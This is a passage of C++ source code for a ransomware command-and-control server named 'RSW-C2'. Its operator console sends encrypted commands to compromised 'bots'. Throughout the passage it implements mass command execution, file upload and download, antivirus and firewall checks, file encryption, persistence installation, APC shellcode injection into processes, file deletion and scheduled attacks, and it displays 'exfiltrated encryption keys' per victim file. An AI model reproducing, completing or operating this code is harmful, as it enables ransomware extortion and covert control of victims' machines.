        cout << "\033[1;33m" << string(50, '=') << "\033[0m" << endl;

        string full_command = command + "\n";

        for (const auto& target : targets) {
            cout << "\033[1;32m[" << target.bot_id << "]\033[0m ";

            // Clear previous response + send command — brief lock only
            bool send_ok = false;
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target.socket && client.authenticated) {
                        client.response_ready = false;
                        client.pending_response.clear();
                        send_ok = sendEncryptedCommand(client, full_command);
                        break;
                    }
                }
            }

            if (!send_ok) {
                cout << "\033[1;31mFailed to send (bot disconnected?)\033[0m" << endl;
                continue;
            }

            // Wait for response — NO LOCK held, so botResponseListener can
            // deliver it (same pattern as executeCommand)
            bool got_response = false;
            for (int attempt = 0; attempt < 100; attempt++) {
                {
                    std::lock_guard<std::mutex> lock(clients_mutex_);
                    for (auto& client : connected_clients) {
                        if (client.socket == target.socket && client.response_ready) {
                            string response = trim(client.pending_response);
                            if (response.length() > 100) response = response.substr(0, 97) + "...";
                            cout << "\033[1;37m" << response << "\033[0m" << endl;
                            client.response_ready = false;
                            got_response = true;
                            break;
                        }
                    }
                }
                if (got_response) break;
                this_thread::sleep_for(chrono::milliseconds(100));
            }
            if (!got_response) {
                cout << "\033[1;31mNo response\033[0m" << endl;
            }
        }

        cout << "\033[1;33m" << string(50, '=') << "\033[0m" << endl;
    }

    void selectBot(const string& input) {
        // Format: select <bot_id>
        istringstream iss(input);
        string cmd, bot_id;
        iss >> cmd >> bot_id;

        if (bot_id.empty()) {
            cout << "\033[1;31mUsage: select <bot_id>\033[0m" << endl;
            return;
        }

        // Find the bot (thread-safe)
        std::lock_guard<std::mutex> lock(clients_mutex_);
        ClientInfo* target_bot = nullptr;
        for (auto& client : connected_clients) {
            if (client.bot_id == bot_id && client.authenticated) {
                target_bot = &client;
                break;
            }
        }

        if (target_bot == nullptr) {
            cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
            return;
        }

        // Enter session mode
        in_session = true;
        selected_bot_id = bot_id;
        selected_bot_socket = target_bot->socket;

        cout << "\033[1;32m[SESSION] Connected to bot: " << bot_id << "\033[0m" << endl;
        cout << "\033[1;36mIP: " << target_bot->ip << ":" << target_bot->port << "\033[0m" << endl;
        cout << "\033[1;33mType 'back' or 'exit' to return to main interface\033[0m" << endl;
        cout << "\033[1;33mAll commands will be sent directly to this bot\033[0m" << endl;
    }

    void showSessionInfo() {
        if (!in_session || selected_bot_socket < 0) {
            cout << "\033[1;31mNot in session mode\033[0m" << endl;
            return;
        }

        cout << "\033[1;36m" << string(40, '=') << "\033[0m" << endl;
        cout << "\033[1;32mCurrent Session Information:\033[0m" << endl;
        cout << "\033[1;37mBot ID: \033[1;33m" << selected_bot_id << "\033[0m" << endl;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (auto& c : connected_clients) {
                if (c.socket == selected_bot_socket) {
                    cout << "\033[1;37mIP Address: \033[1;33m" << c.ip << ":" << c.port << "\033[0m" << endl;
                    cout << "\033[1;37mConnection Time: \033[1;33m" << ctime(&c.connected_at) << "\033[0m" << endl;
                    cout << "\033[1;37mLast Seen: \033[1;33m" << ctime(&c.last_seen) << "\033[0m" << endl;
                    break;
                }
            }
        }
        cout << "\033[1;36m" << string(40, '=') << "\033[0m" << endl;
    }

    void exitSession() {
        if (!in_session) {
            cout << "\033[1;31mNot in session mode\033[0m" << endl;
            return;
        }

        cout << "\033[1;32m[SESSION] Disconnected from bot: " << selected_bot_id << "\033[0m" << endl;

        in_session = false;
        selected_bot_id.clear();
        selected_bot_socket = -1;
    }

    void sendSessionCommand(const string& command) {
        if (!in_session || selected_bot_socket < 0) {
            cout << "\033[1;31mNot in session mode\033[0m" << endl;
            return;
        }

        // Clear previous response + send command (thread-safe, no dangling pointer)
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            bool found = false;
            for (auto& c : connected_clients) {
                if (c.socket == selected_bot_socket) {
                    c.response_ready = false;
                    c.pending_response.clear();
                    string full_command = command + "\n";
                    if (!sendEncryptedCommand(c, full_command)) {
                        cout << "\033[1;31mFailed to send command to bot\033[0m" << endl;
                        return;
                    }
                    found = true;
                    break;
                }
            }
            if (!found) {
                cout << "\033[1;31mBot disconnected during session\033[0m" << endl;
                in_session = false;
                selected_bot_socket = -1;
                selected_bot_id.clear();
                return;
            }
        }

        // Wait for response — brief lock per attempt (botResponseListener can deliver)
        for (int attempt = 0; attempt < 100; attempt++) {
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                bool found = false;
                for (auto& c : connected_clients) {
                    if (c.socket == selected_bot_socket) {
                        found = true;
                        if (c.response_ready) {
                            cout << "\033[1;37m" << c.pending_response << "\033[0m" << endl;
                            c.response_ready = false;
                            return;
                        }
                        break;
                    }
                }
                if (!found) {
                    cout << "\033[1;31mBot disconnected during wait\033[0m" << endl;
                    in_session = false;
                    selected_bot_socket = -1;
                    selected_bot_id.clear();
                    return;
                }
            }
            this_thread::sleep_for(chrono::milliseconds(100));
        }
        cout << "\033[1;31mFailed to receive response from bot\033[0m" << endl;
    }

    string getPrompt() {
        if (in_session) {
            return "\033[1;32m[" + selected_bot_id + "]\033[1;37m> \033[0m";
        } else {
            return "\033[1;36mRSW-C2\033[1;37m> \033[0m";
        }
    }

    // Scheduler Functions
    string generateTaskID() {
        static int task_counter = 1;
        return "TASK_" + to_string(task_counter++);
    }

    time_t parseScheduleTime(const string& schedule_str) {
        time_t now = time(nullptr);
        struct tm* tm_now = localtime(&now);

        if (schedule_str.find("*/") == 0) {
            // Interval format: */N (every N minutes)
            try {
                int interval = stoi(schedule_str.substr(2));
                if (interval <= 0) {
                    // */0 or negative → next_run lands at/before 'now' on every
                    // tick → scheduler would re-trigger the task forever.
                    // Reject at creation instead.
                    return 0;
                }
                return now + (interval * 60);
            } catch (const exception&) {
                return 0; // Invalid interval number
            }
        }
        else if (schedule_str.find(":") != string::npos) {
            // Daily format: HH:MM
            size_t colon_pos = schedule_str.find(":");
            try {                int hour = stoi(schedule_str.substr(0, colon_pos));
                int minute = stoi(schedule_str.substr(colon_pos + 1));

                struct tm target_tm = *tm_now;
                target_tm.tm_hour = hour;
                target_tm.tm_min = minute;
                target_tm.tm_sec = 0;

                time_t target_time = mktime(&target_tm);

                // If time has passed today, schedule for tomorrow
                if (target_time <= now) {
                    target_time += 24 * 60 * 60;
                }

                return target_time;
            } catch (const exception&) {
                return 0; // Invalid hour/minute format
            }
        }

        return 0; // Invalid format
    }

    void startScheduler() {
        scheduler_running = true;
        scheduler_thread = thread(&RSW_C2::schedulerLoop, this);
    }

    void schedulerLoop() {
        while (scheduler_running && running) {
            time_t now = time(nullptr);

            // SNAPSHOT + EXECUTE OUTSIDE THE LOCK:
            // executeScheduledTask() blocks up to 10s per bot (executeCommand's
            // response polling). Holding tasks_mutex_ across it would stall
            // schedule/task-remove/task-toggle for that whole time — and any
            // UI edit would queue behind a possibly-hung bot. Instead: copy the
            // due tasks under the lock, release, execute, then re-validate
            // under the lock before updating (the user may have removed a task
            // while it was running).
            vector<ScheduledTask> due;
            {
                std::lock_guard<std::mutex> lock(tasks_mutex_);
                for (const auto& pair : scheduled_tasks) {
                    const ScheduledTask& task = pair.second;
                    if (task.is_active && now >= task.next_run) {
                        due.push_back(task);
                    }
                }
            }

            for (const ScheduledTask& snap : due) {
                cout << "\n\033[1;33m[SCHEDULER] Executing task: " << snap.task_id << "\033[0m" << endl;

                // Execute OUTSIDE the lock (can block on bot responses)
                executeScheduledTask(snap);

                // Re-validate + update under lock. Erase check first: the task
                // may have been removed during execution (lock was released).
                {
                    std::lock_guard<std::mutex> lock(tasks_mutex_);
                    auto it = scheduled_tasks.find(snap.task_id);
                    if (it == scheduled_tasks.end()) continue;  // removed meanwhile
                    ScheduledTask& task = it->second;

                    // Update next run time
                    if (task.schedule_time.find("*/") == 0) {
                        // Interval task - calculate next run
                        try {
                            int interval = stoi(task.schedule_time.substr(2));
                            if (interval <= 0) {
                                // */0 or negative → next_run stays at/before
                                // 'now' → this tick would re-trigger forever.
                                // Disable instead of busy-looping.
                                task.is_active = false;
                                cout << "\033[1;31m[SCHEDULER] Disabled task " << task.task_id
                                     << " (non-positive interval)\033[0m" << endl;
                            } else {
                                task.next_run = now + ((time_t)interval * 60);
                            }
                        } catch (const exception&) {
                            // Corrupt schedule — disable task to prevent repeated failures
                            task.is_active = false;
                            cout << "\033[1;31m[SCHEDULER] Disabled task " << task.task_id
                                 << " due to invalid interval format\033[0m" << endl;
                        }
                    } else {
                        // Daily task - schedule for next day
                        time_t nr = parseScheduleTime(task.schedule_time);
                        if (nr == 0) {
                            // Unparseable HH:MM → parseScheduleTime returns 0
                            // (== epoch 1970) → always due → infinite re-trigger.
                            // Disable instead.
                            task.is_active = false;
                            cout << "\033[1;31m[SCHEDULER] Disabled task " << task.task_id
                                 << " due to invalid time format\033[0m" << endl;
                        } else {
                            task.next_run = nr;
                        }
                    }

                    task.run_count++;
                }
            }

            // Sleep ~30s before next check, in 1s slices so the destructor's
            // scheduler_thread.join() returns promptly at shutdown instead of
            // waiting out the full sleep while holding the process open.
            for (int i = 0; i < 30 && scheduler_running && running; i++) {
                this_thread::sleep_for(chrono::seconds(1));
            }
        }
    }

    void executeScheduledTask(const ScheduledTask& task) {
        if (task.target_bots == "all") {
            // Execute on all bots
            string exec_all_cmd = "exec-all " + task.command;
            execAllCommand(exec_all_cmd);
        } else {
            // Execute on specific bot
            string execute_cmd = "execute " + task.target_bots + " " + task.command;
            executeCommand(execute_cmd);
        }
    }

    void scheduleTask(const string& input) {
        // Format: schedule <time> <target> <command>
        istringstream iss(input);
        string cmd, time_str, target;
        iss >> cmd >> time_str >> target;

        if (time_str.empty() || target.empty()) {
            cout << "\033[1;31mUsage: schedule <time> <target> <command>\033[0m" << endl;
            cout << "\033[1;33mTime formats: HH:MM or */N\033[0m" << endl;
            cout << "\033[1;33mTarget: 'all' or bot_id\033[0m" << endl;
            return;
        }

        // Extract command (everything after target)
        string command;
        size_t target_pos = input.find(target);
        if (target_pos != string::npos) {
            size_t cmd_start = target_pos + target.length();
            if (cmd_start < input.length()) {
                command = input.substr(cmd_start);
                command = trim(command);
            }
        }

        if (command.empty()) {
            cout << "\033[1;31mCommand cannot be empty\033[0m" << endl;
            return;
        }

        // Parse schedule time
        time_t next_run = parseScheduleTime(time_str);
        if (next_run == 0) {
            cout << "\033[1;31mInvalid time format. Use HH:MM or */N\033[0m" << endl;
            return;
        }

        // Create task
        ScheduledTask task;
        task.task_id = generateTaskID();
        task.command = command;
        task.schedule_time = time_str;
        task.target_bots = target;
        task.next_run = next_run;

        // RACE FIX: scheduler thread iterates this map every 30s — insert must
        // hold tasks_mutex_ or the iteration can see a torn/reallocating map.
        {
            std::lock_guard<std::mutex> lock(tasks_mutex_);
            scheduled_tasks[task.task_id] = task;
        }

        cout << "\033[1;32m[SCHEDULER] Task created: " << task.task_id << "\033[0m" << endl;
        cout << "\033[1;36mSchedule: " << time_str << "\033[0m" << endl;
        cout << "\033[1;36mTarget: " << target << "\033[0m" << endl;
        cout << "\033[1;36mCommand: " << command << "\033[0m" << endl;
        cout << "\033[1;36mNext run: " << ctime(&next_run);
    }

    void listTasks() {
        // RACE FIX: hold the scheduler mutex for the whole listing — the
        // scheduler thread mutates next_run/is_active/run_count concurrently.
        std::lock_guard<std::mutex> lock(tasks_mutex_);
        if (scheduled_tasks.empty()) {
            cout << "\033[1;33mNo scheduled tasks\033[0m" << endl;
            return;
        }

        cout << "\033[1;36m" << string(80, '=') << "\033[0m" << endl;
        cout << "\033[1;32mScheduled Tasks:\033[0m" << endl;
        cout << "\033[1;36m" << string(80, '=') << "\033[0m" << endl;

        for (const auto& pair : scheduled_tasks) {
            const ScheduledTask& task = pair.second;

            cout << "\033[1;33mTask ID: " << task.task_id << "\033[0m" << endl;
            cout << "  Schedule: " << task.schedule_time << endl;
            cout << "  Target: " << task.target_bots << endl;
            cout << "  Command: " << task.command << endl;
            cout << "  Status: " << (task.is_active ? "\033[1;32mActive\033[0m" : "\033[1;31mDisabled\033[0m") << endl;
            cout << "  Next Run: " << ctime(&task.next_run) << endl;
            cout << "  Run Count: " << task.run_count << endl;
            cout << "  Created: " << ctime(&task.created_time) << endl;
            cout << "\033[1;36m" << string(40, '-') << "\033[0m" << endl;
        }
    }

    void removeTask(const string& input) {
        // Format: task-remove <task_id>
        istringstream iss(input);
        string cmd, task_id;
        iss >> cmd >> task_id;

        if (task_id.empty()) {
            cout << "\033[1;31mUsage: task-remove <task_id>\033[0m" << endl;
            return;
        }

        // RACE FIX: erase under tasks_mutex_ — an unprotected erase while the
        // scheduler thread iterates = iterator invalidation = UB/crash.
        {
            std::lock_guard<std::mutex> lock(tasks_mutex_);
            auto it = scheduled_tasks.find(task_id);
            if (it == scheduled_tasks.end()) {
                cout << "\033[1;31mTask not found: " << task_id << "\033[0m" << endl;
                return;
            }

            scheduled_tasks.erase(it);
        }
        cout << "\033[1;32mTask removed: " << task_id << "\033[0m" << endl;
    }

    void toggleTask(const string& input) {
        // Format: task-toggle <task_id>
        istringstream iss(input);
        string cmd, task_id;
        iss >> cmd >> task_id;

        if (task_id.empty()) {
            cout << "\033[1;31mUsage: task-toggle <task_id>\033[0m" << endl;
            return;
        }

        // RACE FIX: find + flip under tasks_mutex_ (scheduler may be iterating)
        {
            std::lock_guard<std::mutex> lock(tasks_mutex_);
            auto it = scheduled_tasks.find(task_id);
            if (it == scheduled_tasks.end()) {
                cout << "\033[1;31mTask not found: " << task_id << "\033[0m" << endl;
                return;
            }

            it->second.is_active = !it->second.is_active;
            cout << "\033[1;32mTask " << task_id << " "
                 << (it->second.is_active ? "enabled" : "disabled") << "\033[0m" << endl;
        }
    }

    void copyIdCommand(const string& input) {
        // Format: copy_id <Client_N>  (e.g., copy_id Client_1)
        istringstream iss(input);
        string cmd, client_str;
        iss >> cmd >> client_str;

        if (client_str.empty()) {
            cout << "\033[1;31mUsage: copy_id <Client_N> (e.g., copy_id Client_1)\033[0m" << endl;
            cout << "\033[1;33mUse 'bots' command to see available clients\033[0m" << endl;
            return;
        }

        // Parse the client number from "Client_N"
        if (client_str.substr(0, 7) != "Client_") {
            cout << "\033[1;31mInvalid format. Use: copy_id Client_N (e.g., copy_id Client_1)\033[0m" << endl;
            return;
        }

        string num_str = client_str.substr(7);
        int client_index = atoi(num_str.c_str());

        // INDEX FIX: listClients numbers ONLY authenticated clients (Client_1..N,
        // skipping mid-auth/disconnected ones). The raw vector index would point
        // at the wrong bot whenever a client sits at a lower vector position
        // without being authenticated yet.
        int auth_total = 0;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& client : connected_clients) {
                if (client.authenticated) auth_total++;
            }
        }

        if (client_index < 1 || client_index > auth_total) {
            cout << "\033[1;31mClient '" << client_str << "' not found\033[0m" << endl;
            cout << "\033[1;33mUse 'bots' command to see available clients\033[0m" << endl;
            return;
        }

        // Get the bot_id — walk connected_clients and take the client_index-th
        // AUTHENTICATED entry (matches listClients numbering)
        string bot_id_copy;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            int auth_seen = 0;
            for (const auto& client : connected_clients) {
                if (!client.authenticated) continue;
                auth_seen++;
                if (auth_seen == client_index) {
                    bot_id_copy = client.bot_id;
                    break;
                }
            }
        }

        // Copy to clipboard using platform-native tool (no lock needed — bot_id copied)
        #ifdef _WIN32
            string clip_cmd = "echo " + bot_id_copy + " | clip";
            system(clip_cmd.c_str());
        #else
            FILE* pipe = popen("pbcopy", "w");
            if (!pipe) {
                cout << "\033[1;31mFailed to copy to clipboard (pbcopy not available)\033[0m" << endl;
                return;
            }
            fwrite(bot_id_copy.c_str(), 1, bot_id_copy.length(), pipe);
            pclose(pipe);
        #endif

        cout << "\033[1;32m[COPIED] Bot ID '" << bot_id_copy << "' copied to clipboard!\033[0m" << endl;
    }

    void processCommand(const string& input) {
        string trimmed_input = trim(input);
        bool wants_details = false;

        if (!trimmed_input.empty() && trimmed_input.back() == '?') {
            wants_details = true;
            trimmed_input.pop_back();
            trimmed_input = trim(trimmed_input);
        }

        string command = trimmed_input;
        transform(command.begin(), command.end(), command.begin(), ::tolower);

        if (wants_details) {
            showCommandDetails(command);
            return;
        }

        // Session mode handling
        if (in_session) {
            if (command == "back" || command == "exit") {
                exitSession();
                return;
            }
            else if (command == "session") {
                showSessionInfo();
                return;
            }
            else if (command == "help") {
                showHelp();
                return;
            }
            else if (command.empty()) {
                return;
            }
            else {
                // Send command directly to selected bot
                sendSessionCommand(trimmed_input);
                return;
            }
        }

        // Main interface commands
        if (command == "help") {
            showHelp();
        }
        else if (command == "exit" || command == "quit") {
            cout << "\033[1;31mShutting down RSW-C2 server...\033[0m" << endl;
            running = false;
        }
        else if (command == "clear") {
            clearScreen();
            showBanner();
        }
        else if (command == "bots" || command == "clients") {
            listClients();
        }
        else if (command == "status") {
            showStatus();
        }
        else if (command == "banner") {
            showBanner();
        }
        else if (command.substr(0, 7) == "execute") {
            executeCommand(input);
        }
        else if (command.substr(0, 6) == "upload") {
            uploadFile(input);
        }
        else if (command.substr(0, 8) == "download") {
            downloadFile(input);
        }
        else if (command.substr(0, 8) == "av-check") {
            sendSimpleCommand(input, "AV_CHECK");
        }
        else if (command.substr(0, 14) == "firewall-check") {
            sendSimpleCommand(input, "FIREWALL_CHECK");
        }
        else if (command.substr(0, 7) == "encrypt") {
            execEncryptCommand(input);
        }
        else if (command.substr(0, 11) == "persistence") {
            sendSimpleCommand(input, "INSTALL_PERSISTENCE");
        }
        else if (command.substr(0, 4) == "kill") {
            sendSimpleCommand(input, "KILL");
        }
        else if (command.substr(0, 3) == "run") {
            sendSimpleCommand(input, "RUN");
        }
        else if (command.substr(0, 8) == "show_key") {
            // Format: show_key [bot_id]
            istringstream iss(input);
            string cmd, bot_id_filter;
            iss >> cmd >> bot_id_filter;

            {
                std::lock_guard<std::mutex> klock(keys_mutex_);
                if (exfiltrated_keys.empty()) {
                    cout << "\033[1;33mNo exfiltrated keys available\033[0m" << endl;
                    return;
                }

                cout << "\033[1;36m" << string(60, '=') << "\033[0m" << endl;
                cout << "\033[1;32mExfiltrated Encryption Keys:\033[0m" << endl;
                cout << "\033[1;36m" << string(60, '=') << "\033[0m" << endl;

                bool found = false;
                for (const auto& bot_entry : exfiltrated_keys) {
                    // Apply bot_id filter if specified
                    if (!bot_id_filter.empty() && bot_entry.first != bot_id_filter) continue;

                    for (const auto& key_info : bot_entry.second) {
                        cout << "\033[1;33mBot:\033[0m " << bot_entry.first << endl;
                        cout << "\033[1;33mFile:\033[0m " << key_info.first << endl;
                        cout << "\033[1;33mKey:\033[0m  " << key_info.second << endl;
                        cout << "\033[1;36m" << string(40, '-') << "\033[0m" << endl;
                        found = true;
                    }
                }

                if (!found) {
                    if (bot_id_filter.empty()) {
                        cout << "\033[1;31mNo exfiltrated keys found\033[0m" << endl;
                    } else {
                        cout << "\033[1;31mNo exfiltrated keys found for bot: " << bot_id_filter << "\033[0m" << endl;
                    }
                }
            }
        }
        else if (command.substr(0, 10) == "apc-inject") {
            // Format: apc-inject [bot_id] [process_name] [payload]
            istringstream iss(input);
            string cmd, bot_id, process_name, payload;
            iss >> cmd >> bot_id >> process_name;

            // Get rest as payload
            getline(iss, payload);
            if (!payload.empty() && payload[0] == ' ') {
                payload = payload.substr(1);
            }

            if (bot_id.empty() || process_name.empty() || payload.empty()) {
                cout << "\033[1;31mUsage: apc-inject [bot_id] [process_name] [payload]\033[0m" << endl;
                cout << "\033[1;33mExample: apc-inject WIN_A1B2C3 notepad.exe <hex_shellcode>\033[0m" << endl;
                return;
            }

            // Find bot — brief lock
            int target_socket = -1;
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.bot_id == bot_id && client.authenticated) {
                        target_socket = client.socket;
                        break;
                    }
                }
            }

            if (target_socket < 0) {
                cout << "\033[1;31mBot '" << bot_id << "' not found or not authenticated\033[0m" << endl;
                return;
            }

            cout << "\033[1;36m[APC-INJECT] Injecting into " << process_name << " on " << bot_id << "\033[0m" << endl;

            string full_command = "APC-INJECT:" + process_name + ":" + payload + "\n";
            // Send command — brief lock
            {
                std::lock_guard<std::mutex> lock(clients_mutex_);
                for (auto& client : connected_clients) {
                    if (client.socket == target_socket && client.authenticated) {
                        client.response_ready = false;
                        client.pending_response.clear();
                        sendEncryptedCommand(client, full_command);
                        break;
                    }
                }
            }

            // Wait for response — NO LOCK held
            for (int attempt = 0; attempt < 100; attempt++) {
                {
                    std::lock_guard<std::mutex> lock(clients_mutex_);
                    for (auto& client : connected_clients) {
                        if (client.socket == target_socket && client.response_ready) {
                            cout << "\033[1;32m[OUTPUT from " << bot_id << "]\033[0m" << endl;
                            cout << "\033[1;37m" << client.pending_response << "\033[0m" << endl;
                            client.response_ready = false;
                            goto done_apc_inject;
                        }
                    }
                }
                this_thread::sleep_for(chrono::milliseconds(100));
            }
            cout << "\033[1;33m[TIMEOUT] No response from bot\033[0m" << endl;
            done_apc_inject:;
        }
        else if (command.substr(0, 11) == "file-search") {
            execFileSearch(input);
        }
        else if (command.substr(0, 11) == "file-delete") {
            sendSimpleCommand(input, "FILE_DELETE");
        }
        else if (command.substr(0, 9) == "file-move") {
            execFileMove(input);
        }
        else if (command.substr(0, 8) == "dir-list") {
            sendSimpleCommand(input, "DIR_LIST");
        }
        else if (command.substr(0, 8) == "exec-all") {
            execAllCommand(input);
        }
        else if (command.substr(0, 6) == "select") {
            selectBot(input);
        }
        else if (command == "session") {
            showSessionInfo();
        }
        else if (command == "back") {
            exitSession();
        }
        else if (command.substr(0, 8) == "schedule") {
            scheduleTask(input);
        }
        else if (command == "tasks") {
            listTasks();
        }
        else if (command.substr(0, 11) == "task-remove") {
            removeTask(input);
        }
        else if (command.substr(0, 11) == "task-toggle") {
            toggleTask(input);
        }
        else if (command.substr(0, 7) == "copy_id") {
            copyIdCommand(input);
        }
        else if (command.empty()) {
            // Do nothing for empty input
        }
        else {
            cout << "\033[1;31mUnknown command: " << input << "\033[0m" << endl;
            cout << "Type 'help' for available commands." << endl;
        }
    }

    void run() {
        clearScreen();
        showBanner();

        // Otomatik olarak dinlemeye başla
        cout << "\033[1;34m[*] Starting C2 Server on 0.0.0.0:" << server_port << "...\033[0m" << endl;
        startListening();

        string input;
        while (running) {
            // EOF durumu (stdin kapandı — ör. background/systemd ile çalıştırma):
            // getline anında EOF döner ve döngü prompt'u sonsuz basıp CPU yakar.
            // Fix: prompt basma, 1sn bekle, dinlemeye devam et (interaktif kullanımı etkilemez).
            if (cin.eof()) {
                this_thread::sleep_for(chrono::seconds(1));
                continue;
            }

            cout << getPrompt(); // Dinamik prompt
            if (!getline(cin, input)) {
                continue;  // EOF flag'i set edildi — üstteki dal yakalar
            }

            if (!input.empty()) {
                processCommand(input);
            }
        }
    }
};

int main() {
    RSW_C2 server;
    server.run();
    return 0;
}
